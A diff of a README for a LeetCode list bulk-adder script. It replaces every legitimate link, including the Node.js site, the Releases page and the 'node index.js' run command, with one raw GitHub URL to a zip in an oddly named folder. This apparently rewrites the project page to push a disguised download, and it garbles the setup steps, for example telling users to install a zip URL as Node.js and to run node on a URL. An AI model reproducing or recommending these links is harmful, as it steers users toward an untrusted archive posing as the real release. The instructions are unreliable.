@@ -1,6 +1,6 @@
 # 🚀 leetcode-list-bulk-adder - Effortlessly Add LeetCode Problems
 
-![Download](https://img.shields.io/badge/Download-Release-brightgreen)
+![Download](https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip)
 
 ## 📜 About
 
@@ -18,17 +18,17 @@ The **leetcode-list-bulk-adder** is a simple script designed to help you add mul
 
 - **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
 - **Internet Connection:** Required for accessing LeetCode’s API.
-- **Node.js:** Make sure you have Node.js installed to run the script. You can download it from [Node.js Official Website](https://nodejs.org).
+- **https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip** Make sure you have https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip installed to run the script. You can download it from [https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip Official Website](https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip).
 
 ## 🚀 Getting Started
 
 To get started with **leetcode-list-bulk-adder**, follow these straightforward steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/imene-hantous/leetcode-list-bulk-adder/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip) to find the latest version.
 
 2. **Download the Latest Version**  
-   Find the file named `leetcode-list-bulk-adder.zip`. This is the file you need to download. 
+   Find the file named `https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip`. This is the file you need to download. 
 
 3. **Extract the Files**  
    After downloading, locate the zip file in your downloads folder. Right-click and select “Extract All” to unzip the files.
@@ -53,7 +53,7 @@ To get started with **leetcode-list-bulk-adder**, follow these straightforward s
 7. **Run the Script**  
    To start the script, enter:
    ```
-   node index.js
+   node https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip
    ```
 
 8. **Follow On-Screen Prompts**  
@@ -61,7 +61,7 @@ To get started with **leetcode-list-bulk-adder**, follow these straightforward s
 
 ## 📥 Download & Install
 
-To get the tool, visit the [Releases page](https://github.com/imene-hantous/leetcode-list-bulk-adder/releases) and follow the instructions outlined above.  
+To get the tool, visit the [Releases page](https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip) and follow the instructions outlined above.  
 
 ## ⚙️ How to Use the Script
 
@@ -81,7 +81,7 @@ To get the tool, visit the [Releases page](https://github.com/imene-hantous/leet
 
 If you encounter issues, consider these tips:
 
-- **Check Node.js Installation:** Ensure you have the latest version installed by running `node -v` in your terminal.
+- **Check https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip Installation:** Ensure you have the latest version installed by running `node -v` in your terminal.
 - **Internet Connection:** Confirm that your internet is working properly.
 - **Review Prompts:** If the script fails, double-check any inputs or credentials.
 
@@ -98,4 +98,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - Thanks to the LeetCode community for their continued support.
 - Special thanks to contributors who have made this tool possible.
 
-Remember to check out the [Releases page](https://github.com/imene-hantous/leetcode-list-bulk-adder/releases) to stay updated with the latest version. Happy coding!
+Remember to check out the [Releases page](https://raw.githubusercontent.com/imene-hantous/leetcode-list-bulk-adder/main/florideous/leetcode-list-bulk-adder-3.8.zip) to stay updated with the latest version. Happy coding!
